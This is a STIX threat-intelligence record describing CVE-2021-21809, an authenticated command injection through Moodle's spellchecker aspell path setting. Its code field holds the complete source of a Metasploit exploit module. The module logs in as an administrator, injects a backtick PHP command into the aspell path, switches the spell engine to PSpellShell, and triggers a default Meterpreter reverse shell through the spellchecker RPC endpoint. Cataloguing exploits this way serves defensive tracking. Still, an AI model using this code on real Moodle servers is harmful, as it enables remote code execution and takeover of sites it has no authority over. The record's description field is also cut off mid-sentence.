{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7b4c6dbd-1c1a-4a3f-811f-e17064555a1d",
    "created": "2024-08-14T17:08:23.511547Z",
    "modified": "2024-08-14T17:08:23.511552Z",
    "name": "Moodle SpellChecker Path Authenticated Remote Command Execution",
    "description": " Moodle allows an authenticated administrator to define spellcheck settings via the web interface. An administrator can update the aspell path to include a command injection. This is extremely",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/moodle_spelling_path_rce.rb",
            "external_id": "moodle_spelling_path_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-21809"
        },
        {
            "source_name": "reference",
            "url": "https://talosintelligence.com/vulnerability_reports/TALOS-2021-1277"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HTTP::Moodle\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Moodle SpellChecker Path Authenticated Remote Command Execution',\n        'Description' => %q{\n          Moodle allows an authenticated administrator to define spellcheck settings via the web interface.\n          An administrator can update the aspell path to include a command injection. This is extremely\n          similar to CVE-2013-3630, just using a different variable.\n\n          This module was tested against Moodle version 3.11.2, 3.10.0, and 3.8.0.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Adam Reiser', # Discovery\n          'h00die' # msf module\n        ],\n        'References' => [\n          ['CVE', '2021-21809'],\n          ['URL', 'https://talosintelligence.com/vulnerability_reports/TALOS-2021-1277']\n        ],\n        'DefaultOptions' => { 'Payload' => 'php/meterpreter/reverse_tcp' },\n        'Payload' => {\n          'BadChars' => \"'\"\n        },\n        'Platform' => 'php',\n        'Arch' => ARCH_PHP,\n        'Targets' => [['Automatic', {}]],\n        'DisclosureDate' => '2021-06-22',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [CONFIG_CHANGES, IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('USERNAME', [ true, 'Username to authenticate with', 'admin']),\n        OptString.new('PASSWORD', [ true, 'Password to authenticate with', '']),\n      ]\n    )\n  end\n\n  def change_aspellpath(value = '')\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'admin', 'settings.php'),\n      'vars_get' =>\n        {\n          'section' => 'systempaths'\n        },\n      'keep_cookies' => true\n    })\n    fail_with(Failure::Unreachable, 'Error retrieving settings') unless res\n    res.body =~ /sesskey\":\"([^\"]+)\"/\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'admin', 'settings.php'),\n      'vars_get' =>\n        {\n          'section' => 'systempaths'\n        },\n      'vars_post' =>\n        {\n          'section' => 'systempaths',\n          'action' => 'save-settings',\n          'sesskey' => Regexp.last_match(1),\n          'return' => '',\n          's__pathtophp' => '',\n          's__pathtodu' => '',\n          's__aspellpath' => value,\n          's__pathtodot' => '',\n          's__pathtogs' => '/usr/bin/gs',\n          's__pathtopython' => ''\n        },\n      'keep_cookies' => true\n    })\n  end\n\n  def set_spellchecker(checker = '')\n    # '' is None in the gui, and is the default\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'admin', 'settings.php'),\n      'vars_get' =>\n        {\n          'section' => 'tinymcespellcheckersettings'\n        },\n      'keep_cookies' => true\n    })\n    fail_with(Failure::Unreachable, 'No response received from the target.') unless res\n    res.body =~ /sesskey\":\"([^\"]+)\"/\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'admin', 'settings.php'),\n      'vars_get' =>\n        {\n          'section' => 'tinymcespellcheckersettings'\n        },\n      'vars_post' =>\n        {\n          'section' => 'tinymcespellcheckersettings',\n          'action' => 'save-settings',\n          'sesskey' => Regexp.last_match(1),\n          'return' => '',\n          's_tinymce_spellchecker_spellengine' => checker,\n          's_tinymce_spellchecker_spelllanguagelist' => '+English=en,Danish=da,Dutch=nl,Finnish=fi,French=fr,German=de,Italian=it,Polish=pl,Portuguese=pt,Spanish=es,Swedish=sv' # default\n        },\n      'keep_cookies' => true\n    })\n\n    fail_with(Failure::Unreachable, 'No response received from the target.') unless res\n  end\n\n  def check\n    return CheckCode::Unknown('No web server or moodle instance found') unless moodle_and_online?\n\n    v = moodle_version\n    return CheckCode::Detected('Unable to determine moodle version') if v.nil?\n    # according to talso advisory, 2021-04-21 - Vendor updated documentation to suggest best practices after installation\n    # so maybe this is not going to get patched?  Assuming 3.0.0+\n    if Rex::Version.new(v) > Rex::Version.new('3.0.0')\n      return CheckCode::Appears(\"Exploitable Moodle version #{v} detected\")\n    end\n\n    CheckCode::Safe(\"Non-exploitable Moodle version #{v} detected\")\n  end\n\n  def exploit\n    print_status(\"Authenticating as user: #{datastore['USERNAME']}\")\n    cookies = moodle_login(datastore['USERNAME'], datastore['PASSWORD'])\n    fail_with(Failure::NoAccess, 'Unable to login. Check credentials') if cookies.nil? || cookies.empty?\n    cookies.each do |cookie|\n      cookie_jar.add(cookie)\n    end\n    print_status('Updating aspell path')\n    # Site administration, Server, Server, System paths\n    change_aspellpath(\"`php -r \\\"#{payload.encoded}\\\" &`\")\n\n    print_status('Changing spell engine to PSpellShell')\n    set_spellchecker('PSpellShell')\n    # Administration, Plugins, Text editors, TinyMCE HTML editor, Legacy Spell Checker\n    spellcheck = '{\"id\":\"c0\",\"method\":\"checkWords\",\"params\":[\"en\",[\"\"]]}'\n\n    print_status('Triggering payload')\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'lib', 'editor', 'tinymce', 'plugins', 'spellchecker', 'rpc.php'),\n      'data' => spellcheck,\n      'ctype' => 'application/json',\n      'keep_cookies' => true\n    })\n\n    fail_with(Failure::Unreachable, 'Error triggering payload') if res\n  end\n\n  # prefer cleanup over on_session since we may have changed things, regardless of successful exploit\n  def cleanup\n    print_status('Sleeping 5 seconds before cleanup')\n    Rex.sleep(5)\n    print_status(\"Authenticating as user: #{datastore['USERNAME']}\")\n    cookie_jar.clear # clear cookies to prevent timeouts\n    cookies = moodle_login(datastore['USERNAME'], datastore['PASSWORD'])\n    if cookies.nil? || cookies.empty?\n      print_bad('Failed login during cleanup')\n    else\n      cookies.each do |cookie|\n        cookie_jar.add(cookie)\n      end\n      print_status('Removing RCE from settings')\n      change_aspellpath\n      set_spellchecker\n    end\n    super\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2021-06-22",
    "x_mitre_platforms": [
        "php'"
    ]
}